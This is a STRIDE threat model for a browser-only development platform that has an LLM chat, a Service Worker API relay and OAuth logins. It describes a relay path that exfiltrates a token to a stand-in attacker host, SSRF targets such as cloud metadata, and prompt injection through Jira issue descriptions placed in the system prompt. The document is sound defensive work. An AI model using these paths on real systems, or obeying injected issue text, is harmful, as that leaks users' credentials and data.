# Aegis Threat Model

## Document Info
- **Application**: Aegis — Zero-infrastructure browser development platform
- **Version**: 0.1.0
- **Date**: 2026-05-07
- **Methodology**: STRIDE + attack surface analysis
- **Architecture reference**: `CLAUDE.md`, `arch/004-auth-architecture.md`, `arch/006-llm-provider-abstraction.md`

---

## 1. System Overview

Aegis is a single-page application running entirely in the browser. There is no backend server. The application consists of:

| Component | Trust Boundary | Description |
|-----------|---------------|-------------|
| React SPA | Browser main thread | UI rendering, state management, user input handling |
| Service Worker | SW scope (isolated from main thread) | Token storage, API proxying, auth header injection, LLM relay |
| WASM Engine | WASM sandbox | Content resolution, config parsing, tool aggregation |
| IndexedDB | Browser storage (per-origin) | Chat session persistence, Jira response caching |
| localStorage | Browser storage (per-origin) | OAuth tokens (full, including accessToken), LLM provider configs (including API keys), Jira API token credentials, theme preference, persona role |
| sessionStorage | Browser storage (per-origin) | Not used (PKCE verifiers and OAuth state moved to localStorage to survive SPA redirects) |
| `.well-known/aegis-configuration` | Static file (same origin) | Runtime deployment config: OTLP endpoint, OAuth client IDs |

External dependencies (APIs the app communicates with):
- GitHub REST API (api.github.com)
- Jira Cloud REST API (*.atlassian.net)
- Vertex AI API (*.googleapis.com)
- Anthropic API (api.anthropic.com)
- OpenAI API (api.openai.com)
- Ollama (localhost:11434)
- Custom LLM endpoints (user-configured URL)
- Red Hat SSO (OIDC provider)

---

## 2. Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│ Browser Origin (static host — GitHub Pages)                      │
│                                                                  │
│  ┌──────────────────────────┐   ┌──────────────────────────┐    │
│  │ Main Thread (React SPA)  │   │ Service Worker            │    │
│  │                          │   │                           │    │
│  │ • User input             │   │ • Token Map (secrets)     │    │
│  │ • DOM rendering          │◄──┤ • Auth header injection   │    │
│  │ • State stores           │──►│ • LLM API relay           │    │
│  │ • Chat messages          │   │ • Cache strategies        │    │
│  │                          │   │                           │    │
│  └──────────┬───────────────┘   └───────────┬───────────────┘    │
│             │ postMessage                    │ fetch              │
│  ┌──────────┴───────────────┐               │                    │
│  │ WASM Engine              │               │                    │
│  │ • Content resolution     │               │                    │
│  │ • Auth filtering         │               │                    │
│  └──────────────────────────┘               │                    │
│                                              │                    │
│  ┌──────────────────────────┐               │                    │
│  │ Browser Storage          │               │                    │
│  │ • IndexedDB (cache)      │               │                    │
│  │ • localStorage (meta)    │               │                    │
│  │ • sessionStorage (PKCE)  │               │                    │
│  └──────────────────────────┘               │                    │
└──────────────────────────────────────────────┼────────────────────┘
                                               │
                              TRUST BOUNDARY   │
═══════════════════════════════════════════════╪════════════════════
                                               │
              ┌────────────────────────────────┼────────────────┐
              │ External APIs                  │                │
              │ • GitHub, Jira, Vertex AI      ▼                │
              │ • Anthropic, OpenAI, Ollama                     │
              │ • Red Hat SSO, Google OAuth                     │
              └─────────────────────────────────────────────────┘
```

---

## 3. Threat Catalog (STRIDE)

### T1: XSS via Markdown Rendering (Spoofing / Tampering)

| Field | Value |
|-------|-------|
| **Attack vector** | Malicious content in Jira issue descriptions, comments, or LLM responses rendered via `react-markdown` |
| **Impact** | Script execution in user's browser — could exfiltrate IndexedDB data, PKCE verifiers from sessionStorage, or redirect user to phishing page |
| **Affected components** | `CardDetail.tsx` (DescriptionRenderer), `MessageList.tsx` (ReactMarkdown), `ToolResult.tsx` |
| **Current mitigations** | `react-markdown` does not render raw HTML by default (only markdown syntax). `remarkGfm` adds table/autolink support but no HTML pass-through |
| **Residual risk** | **Medium**. If `rehypeRaw` or `dangerouslySetInnerHTML` is ever added, this becomes critical. Link hrefs in markdown could be `javascript:` URIs |
| **Severity** | High |

### T2: OAuth State/CSRF Attacks (Spoofing)

| Field | Value |
|-------|-------|
| **Attack vector** | Attacker crafts a callback URL with a malicious `code` parameter and tricks user into loading it |
| **Impact** | Token fixation — attacker's token stored in victim's session, allowing attacker to see victim's actions |
| **Affected components** | `auth/callback.tsx`, `auth/github.ts`, `auth/atlassian.ts`, `auth/redhat-sso.ts`, `auth/google.ts` |
| **Current mitigations** | PKCE state parameter validated in all callback handlers. State stored in sessionStorage (not guessable). CSRF state mismatch throws before code exchange |
| **Residual risk** | **Low**. State validation is correctly implemented |
| **Severity** | Medium |

### T3: LLM Prompt Injection (Tampering)

| Field | Value |
|-------|-------|
| **Attack vector** | Malicious content in Jira issue descriptions (attacker-controlled input) injected into the LLM system prompt via `buildSystemPrompt()` |
| **Impact** | LLM executes tool calls the user didn't intend; exfiltrates data from tool responses; generates misleading advice |
| **Affected components** | `system-prompt.ts`, `ChatView.tsx`, `tool-router.ts` |
| **Current mitigations** | None. Issue descriptions are concatenated directly into the system prompt without sanitization |
| **Residual risk** | **High**. Any Jira user who can edit an issue description can inject instructions into the LLM context |
| **Severity** | High |

### T4: Service Worker Token Exfiltration via Relay Abuse (Information Disclosure)

| Field | Value |
|-------|-------|
| **Attack vector** | Attacker exploits the LLM relay (`/_aegis/llm/custom/{url}`) to make authenticated requests to arbitrary URLs, exfiltrating tokens via response content |
| **Impact** | API keys and OAuth tokens sent to attacker-controlled endpoints |
| **Affected components** | `sw.js` `handleLLMRelay()`, specifically the `custom` provider path that decodes `remainingPath` as a target URL |
| **Current mitigations** | None. The custom relay accepts any URL via `decodeURIComponent(remainingPath)` and forwards auth headers |
| **Residual risk** | **Critical**. An XSS or a malicious browser extension could use `/_aegis/llm/custom/https%3A%2F%2Fattacker.com` to exfiltrate the custom provider token |
| **Severity** | Critical |

### T5: Open Redirect via OAuth Callback (Spoofing)

| Field | Value |
|-------|-------|
| **Attack vector** | After OAuth callback, the app navigates to `/` or `/settings`. If the redirect target were user-controlled, an attacker could redirect to a phishing site |
| **Impact** | Credential phishing after legitimate OAuth flow |
| **Affected components** | `auth/callback.tsx` |
| **Current mitigations** | Redirect targets are hardcoded (`/` on success, `/settings` on error). No user-controlled redirect parameter |
| **Residual risk** | **Low**. Hardcoded redirects prevent open redirect |
| **Severity** | Low |

### T6: IndexedDB Data Exposure (Information Disclosure)

| Field | Value |
|-------|-------|
| **Attack vector** | Chat sessions persisted in IndexedDB contain user messages and LLM responses that may include sensitive information (code, credentials mentioned in chat) |
| **Impact** | Another application on the same origin, a browser extension, or an XSS attack could read chat history |
| **Affected components** | `stores/chat.ts` (CacheStore persistence), `lib/cache/indexeddb.ts` |
| **Current mitigations** | IndexedDB is per-origin isolated. The `error` field is stripped before persistence. No encryption at rest |
| **Residual risk** | **Medium**. Sensitive conversations are stored unencrypted. 7-day TTL limits exposure window |
| **Severity** | Medium |

### T7: SSRF via Custom LLM Endpoint (Elevation of Privilege)

| Field | Value |
|-------|-------|
| **Attack vector** | User configures a custom LLM endpoint pointing to an internal network resource (e.g., `http://169.254.169.254` for cloud metadata, `http://localhost:6379` for Redis) |
| **Impact** | Read internal network resources via the browser's fetch |
| **Affected components** | `ProviderPicker.tsx` (endpoint input), `sw.js` (LLM relay) |
| **Current mitigations** | Browser's same-origin policy limits some attacks. `fetch()` from SW follows CORS rules. Private network access is blocked by modern browsers |
| **Residual risk** | **Low** in modern browsers. **Medium** in older browsers without Private Network Access enforcement |
| **Severity** | Medium |

### T8: ProviderPicker Type-Unsafe Token Storage (Tampering)

| Field | Value |
|-------|-------|
| **Attack vector** | `ProviderPicker.tsx:202` casts LLM provider IDs (`'anthropic'`, `'openai'`) as `AuthProvider` type (`'github'`). The SW stores these under the cast type |
| **Impact** | Token lookup mismatch could cause tokens to be injected into wrong requests, or tokens to be orphaned |
| **Affected components** | `ProviderPicker.tsx`, `sw-bridge.ts` |
| **Current mitigations** | The SW relay matches by URL path, not token key, so runtime behavior is currently correct despite the type unsafety |
| **Residual risk** | **Medium**. Any refactor of the SW token matching could break this fragile assumption |
| **Severity** | Medium |

### T9: Code Injection via Monaco Editor Content (Tampering)

| Field | Value |
|-------|-------|
| **Attack vector** | Malicious file content loaded from GitHub into Monaco editor could contain script tags or event handlers if the content is ever rendered as HTML |
| **Impact** | XSS if file content escapes the editor context |
| **Affected components** | `MonacoEditor.tsx`, `IDELayout.tsx` |
| **Current mitigations** | Monaco renders content as plain text, not HTML. The editor is a code editor, not an HTML renderer. File content is never used in `dangerouslySetInnerHTML` |
| **Residual risk** | **Low**. Monaco's text model prevents HTML interpretation |
| **Severity** | Low |

### T10: Denial of Service via Chat Memory Growth (Denial of Service)

| Field | Value |
|-------|-------|
| **Attack vector** | Long chat sessions with many large LLM responses grow the in-memory Zustand store and IndexedDB without limit |
| **Impact** | Browser tab crashes from memory exhaustion; IndexedDB quota exceeded |
| **Affected components** | `stores/chat.ts`, `lib/cache/indexeddb.ts` |
| **Current mitigations** | 7-day TTL on IndexedDB sessions. No max message count or max content size limit |
| **Residual risk** | **Medium**. A single long session with large responses could exhaust memory before the 7-day TTL kicks in |
| **Severity** | Low |

### T11: Unvalidated Markdown Links (Spoofing)

| Field | Value |
|-------|-------|
| **Attack vector** | LLM response contains markdown links with `javascript:` URIs or data URIs that execute code when clicked |
| **Impact** | Script execution in user context |
| **Affected components** | `MessageList.tsx` (ReactMarkdown rendering) |
| **Current mitigations** | `react-markdown` renders links as `<a>` elements. No `javascript:` URI filtering is applied |
| **Residual risk** | **High**. `react-markdown` v9+ defaults to allowing `javascript:` in href if not explicitly filtered |
| **Severity** | High |

### T12: PKCE Verifier Accessible to XSS (Information Disclosure)

| Field | Value |
|-------|-------|
| **Attack vector** | During an active OAuth flow, the PKCE code verifier is stored in sessionStorage. An XSS attack during this window could read the verifier |
| **Impact** | Attacker could complete the code exchange if they also have the authorization code (e.g., via network interception) |
| **Affected components** | `auth/github.ts`, `auth/atlassian.ts`, `auth/redhat-sso.ts`, `auth/google.ts` |
| **Current mitigations** | Verifiers are cleared from sessionStorage immediately after callback. The window of exposure is typically <30 seconds during the OAuth redirect |
| **Residual risk** | **Low**. Short exposure window + attacker also needs the authorization code |
| **Severity** | Low |

### T13: Jira API Token Stored in localStorage (Information Disclosure)

| Field | Value |
|-------|-------|
| **Attack vector** | XSS or malicious browser extension reads `aegis_jira_config` from localStorage, which contains `email`, `baseUrl`, and plaintext `apiToken` |
| **Impact** | Attacker obtains Jira API credentials and can make authenticated Jira API calls as the user (read/write issues, transition cards, add comments) |
| **Affected components** | `stores/jira-config.ts`, `lib/jira/client.ts` |
| **Current mitigations** | CSP restricts script sources. API tokens are scoped to the user's Jira permissions. localStorage is per-origin isolated |
| **Residual risk** | **Medium**. Tokens are long-lived and provide full Jira API access. Unlike OAuth tokens, there is no expiry or refresh mechanism |
| **Severity** | Medium |

### T14: LLM API Keys Stored in localStorage (Information Disclosure)

| Field | Value |
|-------|-------|
| **Attack vector** | XSS or malicious browser extension reads `aegis_llm_providers` from localStorage, which contains plaintext API keys for configured LLM providers (OpenAI, Anthropic, etc.) |
| **Impact** | Attacker obtains LLM API keys and can make API calls billed to the user's account |
| **Affected components** | `stores/llm-config.ts`, `lib/llm/restore-providers.ts` |
| **Current mitigations** | CSP restricts script sources. Keys are also sent to the Service Worker for API calls, but the source of truth for persistence is localStorage |
| **Residual risk** | **Medium**. API keys can incur direct financial cost. Users should set spending limits on their provider accounts |
| **Severity** | Medium |

---

## 4. Risk Summary

| Threat | Severity | Residual Risk | Priority |
|--------|----------|---------------|----------|
| **T4**: SW relay SSRF/token exfil | Critical | Critical | P0 |
| **T3**: LLM prompt injection | High | High | P1 |
| **T11**: Unvalidated markdown links | High | High | P1 |
| **T1**: XSS via markdown rendering | High | Medium | P1 |
| **T8**: Type-unsafe token storage | Medium | Medium | P2 |
| **T6**: IndexedDB data exposure | Medium | Medium | P2 |
| **T10**: DoS via chat memory | Low | Medium | P3 |
| **T7**: SSRF via custom endpoint | Medium | Low | P3 |
| **T2**: OAuth CSRF | Medium | Low | P3 |
| **T5**: Open redirect | Low | Low | P4 |
| **T13**: Jira API token in localStorage | Medium | Medium | P2 |
| **T14**: LLM API keys in localStorage | Medium | Medium | P2 |
| **T9**: Monaco code injection | Low | Low | P4 |
| **T12**: PKCE verifier exposure | Low | Low | P4 |

---

## 5. Recommended Mitigations

### P0 (Must fix before any deployment)
1. **T4**: Restrict the custom LLM relay to a user-configured allowlist of endpoints. Do not accept arbitrary URLs. Validate against a stored config, not the request path.

### P1 (Fix before production use)
2. **T11/T1**: Add `rehype-sanitize` to the ReactMarkdown pipeline to strip `javascript:` URIs and dangerous HTML elements. Use a strict schema that allows only safe markdown elements.
3. **T3**: Sanitize or clearly delimit user-controlled content (issue descriptions) in system prompts. Use clear boundary markers (e.g., `<user_content>...</user_content>`) so the LLM can distinguish instructions from data.

### P2 (Fix in next iteration)
4. **T8**: Introduce a proper `LLMProviderKey` type distinct from `AuthProvider` for the SW token storage of LLM API keys.
5. **T6**: Consider encrypting sensitive chat content in IndexedDB using a per-session key derived from the user's auth token.
6. **T13/T14**: Consider migrating Jira API tokens and LLM API keys from localStorage to Service Worker memory or an encrypted storage layer. Document risk: recommend users set spending limits on LLM provider accounts and use scoped Jira tokens.

### P3 (Track for future)
6. **T10**: Add max message count and max total content size limits to chat sessions.
7. **T7**: Validate custom endpoint URLs against a pattern (must be HTTPS, must not target private IP ranges).
